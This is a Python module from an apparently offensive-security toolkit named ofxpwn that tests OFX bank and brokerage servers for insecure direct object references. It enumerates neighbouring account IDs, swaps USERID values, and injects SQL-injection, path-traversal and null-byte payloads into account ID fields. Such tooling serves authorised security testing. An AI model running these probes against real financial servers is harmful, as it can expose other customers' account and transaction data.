"""
IDOR (Insecure Direct Object Reference) Testing Module

Tests for authorization bypass vulnerabilities by manipulating account identifiers,
user IDs, and other object references in OFX requests.
"""

from typing import Dict, Any, List, Optional
import re

from ofxpwn.core.base_module import BaseModule
from ofxpwn.core.config import Config
from ofxpwn.core.logger import Logger
from ofxpwn.core.protocol import OFXRequest
from ofxpwn.core.sender import OFXSender
from ofxpwn.core.response_parser import OFXResponseParser


class IDORModule(BaseModule):
    """Test for Insecure Direct Object Reference vulnerabilities"""

    @classmethod
    def get_description(cls) -> str:
        return "Test for IDOR vulnerabilities by manipulating account identifiers"

    def run(self, config: Config, logger: Logger) -> Dict[str, Any]:
        """Run IDOR testing"""
        self.config = config
        self.logger = logger

        logger.info("="*60)
        logger.info("IDOR (Insecure Direct Object Reference) Testing")
        logger.info("="*60)
        logger.warning("Testing authorization controls on account access...")
        logger.info("")

        # Get base account from config or previous enumeration
        base_accounts = config.get('idor_test_accounts', [])

        if not base_accounts:
            logger.error("No test accounts configured!")
            logger.info("Run account enumeration first or configure 'idor_test_accounts' in config")
            logger.info("Example config:")
            logger.info("  idor_test_accounts:")
            logger.info("    - type: INVESTMENT")
            logger.info("      acctid: '12345678'")
            logger.info("      brokerid: 'example.com'")
            return {'error': 'No test accounts configured'}

        ofx = OFXRequest(
            org=config.get_target_org(),
            fid=config.get_target_fid()
        )
        sender = OFXSender(config, logger)

        results = {
            'sequential_enum_success': [],
            'userid_manipulation_success': [],
            'cross_account_success': [],
            'special_char_success': [],
            'total_tested': 0,
            'potential_idor': 0
        }

        # Get credentials
        username = config.get('auth', {}).get('username')
        password = config.get('auth', {}).get('password')

        if not username or not password:
            logger.error("No credentials configured!")
            return {'error': 'No credentials'}

        # Test 1: Sequential Account ID Enumeration
        logger.info("="*60)
        logger.info("TEST 1: Sequential Account ID Enumeration")
        logger.info("="*60)
        logger.info("Testing sequential account IDs around known account")
        logger.info("")

        for base_acct in base_accounts:
            self._test_sequential_enumeration(
                base_acct, ofx, sender, username, password, results
            )

        # Test 2: USERID Manipulation
        logger.info("\n" + "="*60)
        logger.info("TEST 2: USERID Manipulation in Request Body")
        logger.info("="*60)
        logger.info("Testing if different USERID values in message body are honored")
        logger.info("")

        self._test_userid_manipulation(
            base_accounts[0] if base_accounts else None,
            ofx, sender, username, password, results
        )

        # Test 3: Wildcard and Special Characters
        logger.info("\n" + "="*60)
        logger.info("TEST 3: Wildcard and Special Characters")
        logger.info("="*60)
        logger.info("Testing special characters in account identifiers")
        logger.info("")

        self._test_special_characters(
            base_accounts[0] if base_accounts else None,
            ofx, sender, username, password, results
        )

        # Summary
        logger.info("\n" + "="*60)
        logger.info("IDOR Testing Summary")
        logger.info("="*60)

        if results['potential_idor'] > 0:
            logger.finding(
                'CRITICAL',
                'Potential IDOR Vulnerability',
                f'Successfully accessed {results["potential_idor"]} unauthorized accounts',
                f'Sequential enum: {len(results["sequential_enum_success"])}, '
                f'USERID manip: {len(results["userid_manipulation_success"])}'
            )
            logger.warning(f"⚠️  VULNERABLE: {results['potential_idor']} potential IDOR findings!")
        else:
            logger.success("✓ No IDOR vulnerabilities detected")
            logger.info("Account-level authorization properly enforced")

        logger.info(f"\nTotal accounts tested: {results['total_tested']}")
        logger.info(f"Unauthorized access attempts: {results['potential_idor']}")

        stats = sender.get_stats()
        logger.info(f"Requests sent: {stats['requests_sent']}")

        return results

    def _test_sequential_enumeration(
        self,
        base_account: Dict[str, str],
        ofx: OFXRequest,
        sender: OFXSender,
        username: str,
        password: str,
        results: Dict[str, Any]
    ):
        """Test sequential account ID enumeration

        Args:
            base_account: Base account dict with acctid, type, etc
            ofx: OFX request builder
            sender: Request sender
            username: Username for auth
            password: Password for auth
            results: Results dict to update
        """
        base_acctid = base_account.get('acctid', '')

        # Try to parse as numeric and test range
        try:
            base_num = int(base_acctid)
            test_range = range(base_num - 5, base_num + 6)

            for acct_num in test_range:
                # Format with leading zeros if original had them
                if base_acctid.startswith('0'):
                    test_acctid = str(acct_num).zfill(len(base_acctid))
                else:
                    test_acctid = str(acct_num)

                self.logger.info(f"Testing account ID: {test_acctid}")

                # Build request based on account type
                if base_account.get('type') == 'INVESTMENT':
                    request_body = self._build_investment_statement_request(
                        ofx, username, password,
                        base_account.get('brokerid', ''),
                        test_acctid
                    )
                else:
                    request_body = self._build_bank_statement_request(
                        ofx, username, password,
                        base_account.get('bankid', ''),
                        test_acctid,
                        base_account.get('type', 'CHECKING')
                    )

                result = sender.send_request(
                    request_body,
                    save_name=f"idor_sequential_{test_acctid}"
                )

                results['total_tested'] += 1

                if result.get('success'):
                    # Parse response properly
                    parser = OFXResponseParser(result.get('response_text', ''))

                    # Check if data was actually accessed
                    if parser.is_successful_data_access():
                        self.logger.finding(
                            'HIGH',
                            'IDOR - Sequential Enumeration',
                            f'Successfully accessed account {test_acctid}',
                            'Unauthorized account access via sequential ID'
                        )
                        self.logger.warning(f"  ⚠️  SUCCESS - Accessed {test_acctid}")
                        results['sequential_enum_success'].append(test_acctid)
                        results['potential_idor'] += 1
                    elif parser.is_access_denied():
                        self.logger.info(f"  ✓ Access denied (2003)")
                    else:
                        statuses = parser.extract_all_status_codes()
                        self.logger.info(f"  Status: {statuses}")

        except ValueError:
            self.logger.info(f"Account ID '{base_acctid}' is not numeric, skipping sequential test")

    def _test_userid_manipulation(
        self,
        base_account: Optional[Dict[str, str]],
        ofx: OFXRequest,
        sender: OFXSender,
        username: str,
        password: str,
        results: Dict[str, Any]
    ):
        """Test USERID manipulation in request body

        Args:
            base_account: Base account dict
            ofx: OFX request builder
            sender: Request sender
            username: Username for auth
            password: Password for auth
            results: Results dict to update
        """
        if not base_account:
            self.logger.info("No base account available for testing")
            return

        test_userids = [
            "admin",
            "test",
            "user",
            "administrator",
            username.upper() if username else "USER",
            username.lower() if username else "user"
        ]

        for test_userid in test_userids:
            self.logger.info(f"Testing USERID={test_userid} in message body...")

            # Note: Most OFX servers ignore USERID in message bodies,
            # but test anyway for authorization bypass
            if base_account.get('type') == 'INVESTMENT':
                request_body = self._build_investment_statement_request(
                    ofx, username, password,
                    base_account.get('brokerid', ''),
                    base_account.get('acctid', ''),
                    body_userid=test_userid
                )
            else:
                request_body = self._build_bank_statement_request(
                    ofx, username, password,
                    base_account.get('bankid', ''),
                    base_account.get('acctid', ''),
                    base_account.get('type', 'CHECKING'),
                    body_userid=test_userid
                )

            result = sender.send_request(
                request_body,
                save_name=f"idor_userid_{test_userid}"
            )

            results['total_tested'] += 1

            if result.get('success'):
                parser = OFXResponseParser(result.get('response_text', ''))

                if parser.is_successful_data_access():
                    self.logger.finding(
                        'HIGH',
                        'IDOR - USERID Manipulation',
                        f'Accessed data with USERID={test_userid}',
                        'Server may honor USERID in message body'
                    )
                    results['userid_manipulation_success'].append(test_userid)
                    results['potential_idor'] += 1
                else:
                    self.logger.info(f"  ✓ No data access")

    def _test_special_characters(
        self,
        base_account: Optional[Dict[str, str]],
        ofx: OFXRequest,
        sender: OFXSender,
        username: str,
        password: str,
        results: Dict[str, Any]
    ):
        """Test special characters and wildcards in account IDs

        Args:
            base_account: Base account dict
            ofx: OFX request builder
            sender: Request sender
            username: Username for auth
            password: Password for auth
            results: Results dict to update
        """
        if not base_account:
            self.logger.info("No base account available for testing")
            return

        special_chars = [
            "*",
            "%",
            "../../admin",
            "../accounts",
            "1' OR '1'='1",
            "1%00",
            "1;DROP TABLE--"
        ]

        for test_acctid in special_chars:
            self.logger.info(f"Testing account ID: {test_acctid[:30]}...")

            if base_account.get('type') == 'INVESTMENT':
                request_body = self._build_investment_statement_request(
                    ofx, username, password,
                    base_account.get('brokerid', ''),
                    test_acctid
                )
            else:
                request_body = self._build_bank_statement_request(
                    ofx, username, password,
                    base_account.get('bankid', ''),
                    test_acctid,
                    base_account.get('type', 'CHECKING')
                )

            result = sender.send_request(
                request_body,
                save_name=f"idor_special_{test_acctid[:10]}"
            )

            results['total_tested'] += 1

            if result.get('success'):
                parser = OFXResponseParser(result.get('response_text', ''))

                if parser.is_successful_data_access():
                    self.logger.finding(
                        'HIGH',
                        'IDOR - Special Character Bypass',
                        f'Accessed data with special char: {test_acctid[:30]}',
                        'Special characters accepted in account ID'
                    )
                    results['special_char_success'].append(test_acctid)
                    results['potential_idor'] += 1

    def _build_investment_statement_request(
        self,
        ofx: OFXRequest,
        username: str,
        password: str,
        brokerid: str,
        acctid: str,
        body_userid: Optional[str] = None
    ) -> str:
        """Build investment statement request for IDOR testing

        Args:
            ofx: OFX request builder
            username: Username for signon
            password: Password for signon
            brokerid: Broker ID
            acctid: Account ID to test
            body_userid: Optional USERID to include in message body

        Returns:
            OFX request body
        """
        # Build signon
        signon = ofx.build_signon(username, password)

        # Build investment statement request
        userid_tag = f"<USERID>{body_userid}</USERID>" if body_userid else ""

        inv_stmt = f"""<INVSTMTMSGSRQV1>
<INVSTMTTRNRQ>
<TRNUID>3001
{userid_tag}
<INVSTMTRQ>
<INVACCTFROM>
<BROKERID>{brokerid}
<ACCTID>{acctid}
</INVACCTFROM>
<INCTRAN>
<DTSTART>20240101000000
<DTEND>20251231235959
<INCLUDE>Y
</INCTRAN>
<INCOO>Y
<INCPOS>
<DTASOF>20251125000000
<INCLUDE>Y
</INCPOS>
<INCBAL>Y
</INVSTMTRQ>
</INVSTMTTRNRQ>
</INVSTMTMSGSRQV1>
"""

        return ofx.wrap_request(signon + inv_stmt)

    def _build_bank_statement_request(
        self,
        ofx: OFXRequest,
        username: str,
        password: str,
        bankid: str,
        acctid: str,
        accttype: str,
        body_userid: Optional[str] = None
    ) -> str:
        """Build bank statement request for IDOR testing

        Args:
            ofx: OFX request builder
            username: Username for signon
            password: Password for signon
            bankid: Bank routing number
            acctid: Account ID to test
            accttype: Account type (CHECKING, SAVINGS, etc)
            body_userid: Optional USERID to include in message body

        Returns:
            OFX request body
        """
        # Build signon
        signon = ofx.build_signon(username, password)

        # Build bank statement request
        userid_tag = f"<USERID>{body_userid}</USERID>" if body_userid else ""

        bank_stmt = f"""<BANKMSGSRQV1>
<STMTTRNRQ>
<TRNUID>3001
{userid_tag}
<STMTRQ>
<BANKACCTFROM>
<BANKID>{bankid}
<ACCTID>{acctid}
<ACCTTYPE>{accttype}
</BANKACCTFROM>
<INCTRAN>
<DTSTART>20240101000000
<DTEND>20251231235959
<INCLUDE>Y
</INCTRAN>
</STMTRQ>
</STMTTRNRQ>
</BANKMSGSRQV1>
"""

        return ofx.wrap_request(signon + bank_stmt)
